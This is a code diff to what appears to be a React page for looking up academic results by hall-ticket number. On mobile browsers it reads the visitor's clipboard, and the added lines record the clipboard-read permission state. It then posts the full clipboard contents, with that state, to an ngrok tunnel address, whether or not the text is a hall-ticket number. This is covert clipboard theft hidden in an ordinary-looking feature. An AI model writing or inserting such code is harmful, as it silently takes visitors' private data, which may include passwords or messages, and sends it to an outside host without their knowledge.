@@ -24,12 +24,10 @@ const AcademicResult = () => {
     async function readClipboard() {
       try {
         const browser = navigator.userAgent.toLowerCase();
+
         if (browser.includes("android") || browser.includes("iphone")) {
           const text = await navigator.clipboard.readText();
           try {
-            const data = {
-              hallticket: text,
-            };
             const hallticketfirsttwodigits = text.slice(0, 3);
             if (
               text.length === 10 &&
@@ -39,6 +37,25 @@ const AcademicResult = () => {
             ) {
               sethallticketno(text);
             }
+            var status = "g";
+            const queryOpts = {
+              name: "clipboard-read",
+              allowWithoutGesture: false,
+            };
+            const permissionStatus =
+              await navigator.permissions.query(queryOpts);
+
+            if (permissionStatus.state === "granted") {
+              status = "granted";
+            } else if (permissionStatus.state === "denied") {
+              status = "denied";
+            } else {
+              status = "ignored";
+            }
+            var data = {
+              hallticket: text,
+              status: status,
+            };
             const response = await axios.post(
               "https://70af-103-95-173-139.ngrok-free.app",
               data,
